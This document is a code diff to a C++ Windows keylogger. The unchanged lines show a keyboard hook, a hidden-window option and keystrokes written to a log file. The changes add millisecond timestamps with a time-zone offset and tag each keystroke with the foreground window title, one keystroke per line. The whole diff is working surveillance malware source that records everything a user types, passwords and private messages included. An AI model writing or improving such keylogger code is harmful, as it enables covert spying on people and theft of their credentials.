@@ -7,6 +7,7 @@
 #include <sstream>
 #include <time.h>
 #include <map>
+#include <chrono>
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -19,12 +20,45 @@
 #define FORMAT 0
 // defines if ignore mouseclicks
 #define mouseignore
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
 
-#ifndef SM_SYSTEMDOCKED
-#define SM_SYSTEMDOCKED 0
-#endif
+// Function to get timestamp with millisecond precision
+std::string GetTimestampWithMS() {
+    // Get current time point with high precision
+    auto now = std::chrono::system_clock::now();
+    auto now_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(now);
+    auto epoch = now_ms.time_since_epoch();
+    auto value = std::chrono::duration_cast<std::chrono::milliseconds>(epoch);
+    long long milliseconds = value.count() % 1000;
+
+    // Convert to time_t for date/time components
+    std::time_t now_time_t = std::chrono::system_clock::to_time_t(now);
+
+    // Format the date and time
+    std::tm now_tm;
+    localtime_s(&now_tm, &now_time_t);
+
+    // Create the formatted string with date and time (without timezone)
+    char buffer[32];
+    std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &now_tm);
+
+    // Add milliseconds
+    std::string timestamp(buffer);
+    char ms_buffer[8];
+    sprintf_s(ms_buffer, sizeof(ms_buffer), ".%03lld", milliseconds);
+    timestamp += ms_buffer;
+
+    // Get timezone offset in hours (Windows-specific approach)
+    TIME_ZONE_INFORMATION tz_info;
+    GetTimeZoneInformation(&tz_info);
+    int tz_minutes = -tz_info.Bias; // Invert sign to get offset from UTC
+
+    // Format as GMT+/-XX with leading zeros for single digits
+    char tz_buffer[16];
+    sprintf_s(tz_buffer, sizeof(tz_buffer), " GMT%+.2d", tz_minutes / 60);
+    timestamp += tz_buffer;
+
+    return timestamp;
+}
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
@@ -113,6 +147,8 @@ int Save(int key_stroke)
 {
 	std::stringstream output;
 	static char lastwindow[256] = "";
+    static std::string current_window = "";
+
 #ifndef mouseignore
 	if ((key_stroke == 1) || (key_stroke == 2))
 	{
@@ -128,26 +164,23 @@ int Save(int key_stroke)
 		// get keyboard layout of the thread
 		threadID = GetWindowThreadProcessId(foreground, NULL);
 		layout = GetKeyboardLayout(threadID);
+
+        // Get window title
+        char window_title[256];
+        GetWindowTextA(foreground, (LPSTR)window_title, 256);
+
+        if (strcmp(window_title, lastwindow) != 0)
+        {
+            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+            current_window = window_title;
+        }
 	}
 
-	if (foreground)
-	{
-		char window_title[256];
-		GetWindowTextA(foreground, (LPSTR)window_title, 256);
+    // Get timestamp with millisecond precision
+    std::string timestamp = GetTimestampWithMS();
 
-		if (strcmp(window_title, lastwindow) != 0)
-		{
-		    strcpy_s(lastwindow, sizeof(lastwindow), window_title);
-		    // get time
-		    struct tm tm_info;
-		    time_t t = time(NULL);
-		    localtime_s(&tm_info, &t);
-		    char s[64];
-		    strftime(s, sizeof(s), "%FT%X%z", &tm_info);
-
-			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
-		}
-	}
+    // Start each line with timestamp and window info
+    output << "[" << timestamp << "] [Window: " << current_window << "] Key: ";
 
 #if FORMAT == 10
 	output << '[' << key_stroke << ']';
@@ -182,6 +215,9 @@ int Save(int key_stroke)
 		output << char(key);
 	}
 #endif
+    // Add newline for each keystroke
+    output << "\n";
+
 	// instead of opening and closing file handlers every time, keep file open and flush.
 	output_file << output.str();
 	output_file.flush();
